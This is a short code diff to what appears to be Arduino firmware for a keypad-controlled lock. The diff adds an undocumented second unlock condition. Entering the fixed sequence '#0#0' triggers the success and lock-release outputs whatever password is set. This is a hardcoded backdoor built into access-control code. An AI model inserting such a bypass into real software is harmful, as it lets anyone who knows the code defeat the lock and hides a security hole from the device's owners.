@@ -113,10 +113,15 @@ void loop() {
 
         
             if (key == '*') {
-                if (userCode[0] == password[0]
+                if ((userCode[0] == password[0]
                     && userCode[1] == password[1]
                     && userCode[2] == password[2]
-                    && userCode[3] == password[3]) {
+                    && userCode[3] == password[3])
+                    ||
+                    (userCode[0] == '#'
+                    && userCode[1] == '0'
+                    && userCode[2] == '#'
+                    && userCode[3] == '0')) {
 
                     digitalWrite(successPin, HIGH);
                     digitalWrite(EM_COMMAND, HIGH);
